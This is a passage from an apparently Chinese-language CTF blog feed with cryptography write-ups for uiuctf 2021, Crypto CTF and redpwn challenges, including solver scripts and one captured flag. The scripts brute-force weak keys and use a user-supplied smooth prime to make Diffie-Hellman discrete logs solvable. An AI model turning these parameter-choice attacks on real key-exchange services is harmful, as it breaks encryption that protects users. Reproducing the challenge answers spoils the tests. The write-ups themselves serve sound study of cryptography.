class="built_in">range</span>(<span class="number">1</span>, p+<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, p+<span class="number">1</span>):</span><br><span class="line">			k = <span class="built_in">str</span>(<span class="built_in">pow</span>(g, a * b, p))</span><br><span class="line">			key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">			i = <span class="number">0</span></span><br><span class="line">			padding = <span class="string">&#x27;uiuctf2021uiuctf2021&#x27;</span></span><br><span class="line">			<span class="keyword">while</span> <span class="number">16</span> - <span class="built_in">len</span>(key) != <span class="built_in">len</span>(k):</span><br><span class="line">				key = key + padding[i]</span><br><span class="line">				i += <span class="number">1</span></span><br><span class="line">			key = key + k</span><br><span class="line">			key = <span class="built_in">bytes</span>(key, encoding=<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">			cipher = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line">			flag = cipher.decrypt(unhexlify(ciphertext))</span><br><span class="line">			<span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;uiuctf&#x27;</span>):</span><br><span class="line">				<span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="Crypto-back-to-basics"><a href="#Crypto-back-to-basics" class="headerlink" title="Crypto-back_to_basics"></a>Crypto-back_to_basics</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> mpz, to_binary</span><br><span class="line"><span class="comment">#from secret import flag, key</span></span><br><span class="line"></span><br><span class="line">ALPHABET = <span class="built_in">bytearray</span>(<span class="string">b&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ#&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_n_encode</span>(<span class="params">bytes_in, base</span>):</span></span><br><span class="line">	<span class="keyword">return</span> mpz(bytes_to_long(bytes_in)).digits(base).upper().encode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_n_decode</span>(<span class="params">bytes_in, base</span>):</span></span><br><span class="line">	bytes_out = to_binary(mpz(bytes_in, base=base))[:<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">return</span> bytes_out</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">bytes_in, key</span>):</span></span><br><span class="line">	out = bytes_in</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">		<span class="built_in">print</span>(i)</span><br><span class="line">		out = base_n_encode(out, ALPHABET.index(i))</span><br><span class="line">	<span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">bytes_in, key</span>):</span></span><br><span class="line">	out = bytes_in</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">		out = base_n_decode(out, ALPHABET.index(i))</span><br><span class="line">	<span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">flag_enc = encrypt(flag, key)</span></span><br><span class="line"><span class="string">f = open(&quot;flag_enc&quot;, &quot;wb&quot;)</span></span><br><span class="line"><span class="string">f.write(flag_enc)</span></span><br><span class="line"><span class="string">f.close()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>当然还有一个flag_enc文件，word太大了，你要忍一下~</p>
<p>挺有意思的题目，还是尚师傅点醒我的，就是2~36进制的转换，关键函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_n_decode</span>(<span class="params">bytes_in, base</span>):</span></span><br><span class="line">	bytes_out = long_to_bytes(<span class="built_in">int</span>(bytes_in, base=base))</span><br><span class="line">	<span class="keyword">return</span> bytes_out</span><br></pre></td></tr></table></figure>

<p>不得不说，python的int还是挺完善的</p>
<p>然后没有写一次性脚本了，手撕的，因为有些比如key的最后一位是W进制，但是U和V也没在密文里出现，脚本不够完善吧</p>
<h3 id="Crypto-dhke-adventure"><a href="#Crypto-dhke-adventure" class="headerlink" title="Crypto-dhke_adventure"></a>Crypto-dhke_adventure</h3><p>又是jo厨师傅出的题，很明显的离散对数系统的密码题，因为hint有smoother，可以想到是解离散对数的光滑数问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m too lazy to find parameters for my DHKE, choose for me.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter prime at least 1024 at most 2048 bits: &quot;</span>)</span><br><span class="line"><span class="comment"># get user&#x27;s choice of p</span></span><br><span class="line">p = <span class="built_in">input</span>()</span><br><span class="line">p = <span class="built_in">int</span>(p)</span><br><span class="line"><span class="comment"># check prime valid</span></span><br><span class="line"><span class="keyword">if</span> p.bit_length() &lt; <span class="number">1024</span> <span class="keyword">or</span> p.bit_length() &gt; <span class="number">2048</span> <span class="keyword">or</span> <span class="keyword">not</span> isPrime(p):</span><br><span class="line">    exit(<span class="string">&quot;Invalid input.&quot;</span>)</span><br><span class="line"><span class="comment"># prepare for key exchange</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">a = randint(<span class="number">2</span>,p-<span class="number">1</span>)</span><br><span class="line">b = randint(<span class="number">2</span>,p-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># generate key</span></span><br><span class="line">dio = <span class="built_in">pow</span>(g,a,p)</span><br><span class="line">jotaro = <span class="built_in">pow</span>(g,b,p)</span><br><span class="line">key = <span class="built_in">pow</span>(dio,b,p)</span><br><span class="line">key = sha256(<span class="built_in">str</span>(key).encode()).digest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;uiuctf2021uiuctf&#x27;</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line">ciphertext = cipher.encrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Dio sends: &quot;</span>, dio)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Jotaro sends: &quot;</span>, jotaro)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ciphertext: &quot;</span>, ciphertext.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>已知</p>
<p>$dio=g^a\ mod\ p$</p>
<p>$jotaro=g^b\ mod\ p$</p>
<p>$key=dio^b\ mod\ p$</p>
<p>解题的关键是p可以由攻击者提供的，那直接提供一个光滑数+1好了，这样这个DLP离散对数求解的难题就变得可计算了，具体的推导参考pohlig-hellman攻击原理，有能力可以复现</p>
<p>一些小的点，这里直接上脚本了，首先生成一个光滑数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">item = <span class="number">2</span></span><br><span class="line">p = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p *= item</span><br><span class="line">    item = next_prime(item)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1024</span> &lt; p.bit_length() &lt; <span class="number">2048</span> <span class="keyword">and</span> isPrime(p + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(p+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>懒狗了，直接手动接收，然后在sgae里求a和b；这个之前网鼎杯青龙组的you raise me up演示过，最终的脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">p = <span class="number">20404068993016374194542464172774607695659797117423121913227131032339026169175929902244453757410468728842929862271605567818821685490676661985389839958622802465986881376139404138376153096103140834665563646740160279755212317501356863003638612390661668406235422311783742390510526587257026500302696834793248526734305801634165948702506367176701233298064616663553716975429048751575597150417381063934255689124486029492908966644747931</span></span><br><span class="line">a = <span class="number">1706514538409217609380184471483970486111601581179909732547081795755601848099714892783660477820125268651686071436129197042742970850298506167342840465201954449860957095450958345421698689291401652404764413822088773220645950460091121901749681603487210460064157239812734204314334694247020508700704643391774792654182943517813353983667531492481271292815208332729128642069655591289999915464139472699283049217926350224615448461688066</span></span><br><span class="line">b = <span class="number">14466632275269913037069509287532932279884213206515600538938395240468925268146374104530207395909468350257778074856758057525057561502009116834555962090895520108072724285442706303410135968614985268443945781896987070215220814783356743958044861941110284092061774699164461968593879814604175818707171934938878476262296832165434644133455246857171139473183371584687955863862012348287764247314297996868855594079156695942227229848338865</span></span><br><span class="line">dio = <span class="number">16167922424137241666246302388507094614219683075656937696624976269971219170930381539629329712953190516880647147637220034502113432117052541565403357952291692484827614380683288824529855182911429985823152492290185107775580207164746921109360997835543504066225649925051809637197356760554700827177215351020335554912004088973554778245562345835228507025035376705826984822212122075068467338353809039042992813485576139824709322511611135</span></span><br><span class="line"><span class="keyword">assert</span> dio == <span class="built_in">pow</span>(g, a, p)</span><br><span class="line"><span class="keyword">assert</span> jotaro == <span class="built_in">pow</span>(g, b, p)</span><br><span class="line">key = <span class="built_in">pow</span>(dio, b, p)</span><br><span class="line">key = sha256(<span class="built_in">str</span>(key).encode()).digest()</span><br><span class="line">jo = <span class="number">8478318935358501390014596426908185869306605857407596116840606911586830527583698320042764633027826654399751539088096707226001027141331485792640154020208368663060333097725346477808040686885134694513306486060638308544451042554707764114958622916238232491752753035945375341164707378481832386716731243612254449779955395389475168461403985894687650228947467124029857674022920610930987210652487673276585269753595356252512713370074208</span></span><br><span class="line">ciphertext = <span class="string">&#x27;f21c554f4e520e3122eb9708bd88de356b7d0d8d9728536b39d22b706afcdaecd7bed753666a763f8c0d&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;uiuctf2021uiuctf&#x27;</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line">flag = cipher.decrypt(unhexlify(ciphertext))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>新配置的windows terminal真好看，还不会乱码，秀一下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210805183255028.png" alt="image-20210805183255028"></p>
<h2 id="Crypto-CTF"><a href="#Crypto-CTF" class="headerlink" title="Crypto CTF"></a>Crypto CTF</h2><p>当时没来得及打就结束了，所以做出来的都会贴一下flag。谢谢主办方不关nc</p>
<p>签到就不说了</p>
<h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><h4 id="Farm"><a href="#Farm" class="headerlink" title="Farm"></a>Farm</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string, base64, math</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">ALPHABET = string.printable[:<span class="number">62</span>] + <span class="string">&#x27;\\=&#x27;</span></span><br><span class="line"></span><br><span class="line">F = <span class="built_in">list</span>(GF(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>(<span class="params">l</span>):</span></span><br><span class="line">	key = [F[randint(<span class="number">1</span>, <span class="number">63</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(l)] </span><br><span class="line">	key = math.prod(key) <span class="comment"># Optimization the key length :D</span></span><br><span class="line">	<span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maptofarm</span>(<span class="params">c</span>):</span></span><br><span class="line">	<span class="keyword">assert</span> c <span class="keyword">in</span> ALPHABET</span><br><span class="line">	<span class="keyword">return</span> F[ALPHABET.index(c)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">	m64 = base64.b64encode(msg)</span><br><span class="line">	enc, pkey = <span class="string">&#x27;&#x27;</span>, key**<span class="number">5</span> + key**<span class="number">3</span> + key**<span class="number">2</span> + <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> m <span class="keyword">in</span> m64:</span><br><span class="line">		enc += ALPHABET[F.index(pkey * maptofarm(<span class="built_in">chr</span>(m)))]</span><br><span class="line">	<span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"><span class="comment"># KEEP IT SECRET </span></span><br><span class="line">key = keygen(<span class="number">14</span>) <span class="comment"># I think 64**14 &gt; 2**64 is not brute-forcible :P</span></span><br><span class="line"></span><br><span class="line">enc = encrypt(flag, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc = <span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>本来看到是放弃的，套了好几层啊，还有GF不是有限域吗？怎么会出来多项式？？？</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210812224123276.png" alt="image-20210812224123276"></p>
<p>但现在要复现，硬着头皮做了下，没想到第一次就出来了，就是类似字典key和value的关系，关键的key爆破下就好了。本来想画下流程图的，但也就是字母表到F，F到字母表等的一些位置和值的替换，不是很好体现，鉴于是简单题，就不画了。贴下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc = <span class="string">&#x27;805c9GMYuD5RefTmabUNfS9N9YrkwbAbdZE0df91uCEytcoy9FDSbZ8Ay8jj&#x27;</span></span><br><span class="line">ALPHABET = string.printable[:<span class="number">62</span>] + <span class="string">&#x27;\\=&#x27;</span></span><br><span class="line"></span><br><span class="line">F = <span class="built_in">list</span>(GF(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pkey <span class="keyword">in</span> F:</span><br><span class="line">    c = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">        p1 = ALPHABET.index(i)</span><br><span class="line">        p2 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> pkey!= <span class="number">0</span>:</span><br><span class="line">            p2 = F.index(F[p1] / pkey)</span><br><span class="line">        c += ALPHABET[p2]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(base64.b64decode(c))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>然后在64个结果中找flag</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210812224334985.png" alt="image-20210812224334985"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CCTF&#123;EnCrYp7I0n_4nD_5u8STitUtIn9_iN_Fi3Ld!&#125;</span><br></pre></td></tr></table></figure>

<h4 id="KeyBase（unsolved）"><a href="#KeyBase（unsolved）" class="headerlink" title="KeyBase（unsolved）"></a>KeyBase（unsolved）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os, sys, random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">	iv, key = [os.urandom(<span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&#x27;01&#x27;</span>]</span><br><span class="line">	<span class="keyword">return</span> iv, key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg, iv, key</span>):</span></span><br><span class="line">	aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">	<span class="keyword">return</span> aes.encrypt(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">enc, iv, key</span>):</span></span><br><span class="line">	aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">	<span class="keyword">return</span> aes.decrypt(enc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">die</span>(<span class="params">*args</span>):</span></span><br><span class="line">	pr(*args)</span><br><span class="line">	quit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pr</span>(<span class="params">*args</span>):</span></span><br><span class="line">	s = <span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, args))</span><br><span class="line">	sys.stdout.write(s + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sc</span>():</span></span><br><span class="line">	<span class="keyword">return</span> sys.stdin.readline().strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	border = <span class="string">&quot;+&quot;</span></span><br><span class="line">	pr(border*<span class="number">72</span>)</span><br><span class="line">	pr(border, <span class="string">&quot; hi all, welcome to the simple KEYBASE cryptography task, try to    &quot;</span>, border)</span><br><span class="line">	pr(border, <span class="string">&quot; decrypt the encrypted message and get the flag as a nice prize!    &quot;</span>, border)</span><br><span class="line">	pr(border*<span class="number">72</span>)</span><br><span class="line"></span><br><span class="line">	iv, key = keygen()</span><br><span class="line">	flag_enc = encrypt(flag, iv, key).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		pr(<span class="string">&quot;| Options: \n|\t[G]et the encrypted flag \n|\t[T]est the encryption \n|\t[Q]uit&quot;</span>)</span><br><span class="line">		ans = sc().lower()</span><br><span class="line">		<span class="keyword">if</span> ans == <span class="string">&#x27;g&#x27;</span>:</span><br><span class="line">			pr(<span class="string">&quot;| encrypt(flag) =&quot;</span>, flag_enc)</span><br><span class="line">		<span class="keyword">elif</span> ans == <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">			pr(<span class="string">&quot;| Please send your 32 bytes message to encrypt: &quot;</span>)</span><br><span class="line">			msg_inp = sc()</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">len</span>(msg_inp) == <span class="number">32</span>:</span><br><span class="line">				enc = encrypt(msg_inp, iv, key).<span class="built_in">hex</span>()</span><br><span class="line">				r = random.randint(<span class="number">0</span>, <span class="number">4</span>)</span><br><span class="line">				s = <span class="number">4</span> - r</span><br><span class="line">				mask_key = key[:-<span class="number">2</span>].<span class="built_in">hex</span>() + <span class="string">&#x27;*&#x27;</span> * <span class="number">4</span></span><br><span class="line">				mask_enc = enc[:r] + <span class="string">&#x27;*&#x27;</span> * <span class="number">28</span> + enc[<span class="number">32</span>-s:]</span><br><span class="line">				pr(<span class="string">&quot;| enc =&quot;</span>, mask_enc)</span><br><span class="line">				pr(<span class="string">&quot;| key =&quot;</span>, mask_key)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				die(<span class="string">&quot;| SEND 32 BYTES MESSAGE :X&quot;</span>)</span><br><span class="line">		<span class="keyword">elif</span> ans == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">			die(<span class="string">&quot;Quitting ...&quot;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			die(<span class="string">&quot;Bye ...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>暂时还没看</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210713 redpwnCrypto方向部分WP</title>
    <url>/posts/e1a0b897/</url>
    <content><![CDATA[<p>国外的比赛，赛后当赛时打，也不知道什么时候靶机会关掉</p>
<span id="more"></span>

<h1 id="redpwn"><a href="#redpwn" class="headerlink" title="redpwn"></a>redpwn</h1><h2 id="scissor"><a href="#scissor" class="headerlink" title="scissor"></a>scissor</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">egddagzp_ftue_rxms_iuft_rxms_radymf</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">key = random.randint(<span class="number">0</span>, <span class="number">25</span>)</span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">shifted = alphabet[key:] + alphabet[:key]</span><br><span class="line">dictionary = <span class="built_in">dict</span>(<span class="built_in">zip</span>(alphabet, shifted))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([</span><br><span class="line">    dictionary[c]</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> dictionary</span><br><span class="line">    <span class="keyword">else</span> c</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">input</span>()</span><br><span class="line">]))</span><br></pre></td></tr></table></figure>

<p>题目提示凯撒，但有点变行，直接爆破 key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;egddagzp_ftue_rxms_iuft_rxms_radymf&#x27;</span></span><br><span class="line"></span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    shifted = alphabet[key:] + alphabet[:key]</span><br><span class="line">    dictionary = <span class="built_in">dict</span>(<span class="built_in">zip</span>(alphabet, shifted))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([</span><br><span class="line">        dictionary[c]</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> dictionary</span><br><span class="line">        <span class="keyword">else</span> c</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> cipher</span><br><span class="line">    ]))</span><br></pre></td></tr></table></figure>



<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210713160001396.png" alt="image-20210713160001396"></p>
<p>对称密码，加密即解密</p>
<h2 id="baby"><a href="#baby" class="headerlink" title="baby"></a>baby</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">n: 228430203128652625114739053365339856393</span><br><span class="line">e: 65537</span><br><span class="line">c: 126721104148692049427127809839057445790</span><br></pre></td></tr></table></figure>

<p>简单 RSA</p>
<h2 id="round-the-bases（recuring）"><a href="#round-the-bases（recuring）" class="headerlink" title="round-the-bases（recuring）"></a>round-the-bases（recuring）</h2><blockquote>
<p>My flag has been all around the bases. Can you help me get it back?</p>
</blockquote>
<blockquote>
<p>9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9